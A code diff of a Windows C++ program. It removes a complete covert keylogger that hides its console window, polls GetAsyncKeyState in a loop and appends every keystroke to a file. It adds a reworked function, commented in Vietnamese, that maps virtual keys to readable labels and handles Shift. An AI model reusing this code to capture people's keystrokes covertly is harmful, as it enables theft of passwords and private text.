@@ -1,4 +1,3 @@
-#define _WIN32_WINNT 0x0500
 #include <Windows.h>
 #include <string>
 #include <stdlib.h>
@@ -6,110 +5,47 @@
 #include <iostream>
 #include <fstream>
 
-
-
 using namespace std;
 
+bool SpecialKeys(int &S_Key, std::string &output) {
+    // Kiểm tra Shift đang được GIỮ (0x8000)
+    bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
 
+    switch (S_Key) {
+    case VK_SPACE:    output = "[SPACE]";  return true;
+    case VK_RETURN:   output = "[ENTER]"; return true;
+    case VK_BACK:     output = "[BACKSPACE]"; return true; // Xóa ký tự trên Console
+    case VK_TAB:      output = "[TAB]"; return true;
+    
+    // Các phím điều hướng
+    case VK_UP:       output = "[UP]";    return true;
+    case VK_DOWN:     output = "[DOWN]";  return true;
+    case VK_LEFT:     output = "[LEFT]";  return true;
+    case VK_RIGHT:    output = "[RIGHT]"; return true;
 
-void LOG(string input) {
-	fstream LogFile;
-	LogFile.open("dat.txt", fstream::app);
-	if (LogFile.is_open()) {
-		LogFile << input;
-		LogFile.close();
-	}
-}
-
-
-bool SpecialKeys(int S_Key) {
-	switch (S_Key) {
-	case VK_SPACE:
-		cout << " ";
-		LOG(" ");
-		return true;
-	case VK_RETURN:
-		cout << "\n";
-		LOG("\n");
-		return true;
-	case '¾':
-		cout << ".";
-		LOG(".");
-		return true;
-	case VK_SHIFT:
-		cout << "#SHIFT#";
-		LOG("#SHIFT#");
-		return true;
-	case VK_BACK:
-		cout << "\b";
-		LOG("\b");
-		return true;
-	case VK_RBUTTON:
-		cout << "#R_CLICK#";
-		LOG("#R_CLICK#");
-		return true;
-	case VK_CAPITAL:
-		cout << "#CAPS_LOCK#";
-		LOG("#CAPS_LCOK");
-		return true;
-	case VK_TAB:
-		cout << "#TAB";
-		LOG("#TAB");
-		return true;
-	case VK_UP:
-		cout << "#UP";
-		LOG("#UP_ARROW_KEY");
-		return true;
-	case VK_DOWN:
-		cout << "#DOWN";
-		LOG("#DOWN_ARROW_KEY");
-		return true;
-	case VK_LEFT:
-		cout << "#LEFT";
-		LOG("#LEFT_ARROW_KEY");
-		return true;
-	case VK_RIGHT:
-		cout << "#RIGHT";
-		LOG("#RIGHT_ARROW_KEY");
-		return true;
-	case VK_CONTROL:
-		cout << "#CONTROL";
-		LOG("#CONTROL");
-		return true;
-	case VK_MENU:
-		cout << "#ALT";
-		LOG("#ALT");
-		return true;
-	default: 
-		return false;
-	}
-}
-
-
-
-int main()
-{
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char KEY = 'x';
-
-	while (true) {
-		Sleep(10);
-		for (int KEY = 8; KEY <= 190; KEY++)
-		{
-			if (GetAsyncKeyState(KEY) == -32767) {
-				if (SpecialKeys(KEY) == false) {
-                    cerr << "WTF";
-					fstream LogFile;
-					LogFile.open("dat.txt", fstream::app);
-					if (LogFile.is_open()) {
-						LogFile << char(KEY);
-						LogFile.close();
-					}
-
-				}
-			}
-		}
-	}
-
-	return 0;
+    // --- CÁC PHÍM OEM (Xử lý cả Shift) ---
+    case VK_OEM_3:      output = (shift ? "~" : "`");  return true;
+    case VK_OEM_MINUS:  output = (shift ? "_" : "-");  return true;
+    case VK_OEM_PLUS:   output = (shift ? "+" : "=");  return true;
+    case VK_OEM_4:      output = (shift ? "{" : "[");  return true;
+    case VK_OEM_6:      output = (shift ? "}" : "]");  return true;
+    case VK_OEM_5:      output = (shift ? "|" : "\\"); return true;
+    case VK_OEM_1:      output = (shift ? ":" : ";");  return true;
+    case VK_OEM_7:      output = (shift ? "\"" : "'"); return true;
+    case VK_OEM_COMMA:  output = (shift ? "<" : ",");  return true;
+    case VK_OEM_PERIOD: output = (shift ? ">" : ".");  return true;
+    case VK_OEM_2:      output = (shift ? "?" : "/");  return true;
+    // Chặn in mã số của các phím chức năng
+    case VK_SHIFT:   
+		output = "[SHIFT]"; return true;
+    case VK_CONTROL: 
+		output = "[CTRL]";  return true;
+    case VK_MENU:
+		output = "[ALT]";   return true;
+    case VK_CAPITAL:
+		output = "[CAPS]";
+        return true; 
+    default:
+        return false;
+    }
 }
